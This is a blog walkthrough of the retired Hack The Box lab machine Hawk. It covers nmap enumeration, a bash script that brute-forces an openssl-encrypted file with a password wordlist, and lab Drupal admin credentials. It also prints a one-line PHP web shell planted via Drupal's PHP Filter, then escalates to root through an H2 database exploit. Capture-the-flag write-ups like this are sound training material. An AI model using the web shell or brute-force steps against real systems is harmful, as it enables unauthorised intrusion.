---
layout: post
title: "Hawk: Hack The Box Walkthrough"
subtitle: "When I bestride him, I soar; I am a hawk."
date: 2018-12-02 08:34:55 +0000
last_modified_at: 2018-12-09 08:24:05 +0000
category: Walkthrough
tags: ["Hack The Box", Hawk, retired]
comments: true
image:
  feature: hawk-htb-walkthrough.jpg
  credit: Prawny / Pixabay
  creditlink: https://pixabay.com/en/vintage-japanese-watercolour-1829844/
---

This post documents the complete walkthrough of Hawk, a retired vulnerable [VM][1] created by [mrh4sh][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Hawk is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -T5 -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.102
...
PORT     STATE SERVICE       REASON         VERSION
21/tcp   open  ftp           syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.13.108
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5435/tcp open  tcpwrapped    syn-ack ttl 63
8082/tcp open  http          syn-ack ttl 63 H2 database http console
|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
| http-methods:
|_  Supported Methods: GET POST
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc? syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.70%I=7%D=11/28%Time=5BFF2AED%P=x86_64-pc-linux-gnu%r(N
SF:ULL,45E,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o
SF:\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0
SF:i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\
SF:0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t
SF:\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0h\x00
SF:2\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0
SF::\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\
SF:0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n
SF:\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0
SF:A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x
SF:001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s
SF:\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b
SF:\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\
SF:0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0
SF:g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0
SF:o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\
SF:0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0
SF:e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005\0\)\
SF:0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0
SF:D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0
SF:t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x20\0o
SF:\0r");
```

Going the `ftp` route reveals a `messages` directory that contains a hidden file `.drupal.txt.enc`. The file is encrypted by `openssl enc` as characterized by `Salted__` header.

<a class="image-popup">
![0b315a7f.png](/assets/images/posts/hawk-htb-walkthrough/0b315a7f.png)
</a>

### Decryption of AES-256-CBC

I'm guessing the password or passphrase to decrypt the file must be simple. As such, I wrote the following script to automate the decryption of the file by going through a wordlist.

<div class="filename"><span>decrypt.sh</span></div>

```bash
#!/bin/bash

CIPHERS=$1
FILE=$2
PASS=$3

for c in $(cat $CIPHERS); do
  openssl enc $c -d -a -salt -in $FILE -pass pass:"$PASS" &>/dev/null
  if [ $? -eq 0 ]; then
    d="$(openssl enc $c -d -a -salt -in $FILE -pass pass:$PASS 2>/dev/null)"
    echo "[+] Trying $c with '$PASS'..."
    printf "%s\n\n" "$d"
  fi
done
```

Since I don't know the cipher used, the script runs through all the available ciphers in `openssl enc`. Let's run the script.

```
# parallel -j4 ./decrypt.sh ciphers.txt .drupal.txt.enc "{}" < /usr/share/seclist/Passwords/darkweb-top1000.txt | tee decrypted.txt
```

<a class="image-popup">
![083d4843.png](/assets/images/posts/hawk-htb-walkthrough/083d4843.png)
</a>

### Drupal 7.58

This version is not affected by Drupalgeddon2. The credentials to the administrative interface is (`admin:PencilKeyboardScanner123`)

In order to write PHP code as pages in Drupal 7, the PHP Filter module needs to be enabled. Once you have done that, create a PHP page containing the following code:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Simple as it looks, the code allows us to execute remote commands as `www-data`. Well, now we can run a reverse shell back to us.

I have a preference for Perl reverse shell because Perl is, more often than not, available in Linux.

### H2 1.4.196 Remote Code Execution

During enumeration of the `www-data` account, I notice the H2 database is ran as `root`. Simply run the proof-of-concept code from EDB-ID [45506](https://www.exploit-db.com/exploits/45506) to get a `root` shell.

[1]: https://www.hackthebox.eu/home/machines/profile/146
[2]: https://www.hackthebox.eu/home/users/profile/2570
[3]: https://www.hackthebox.eu/
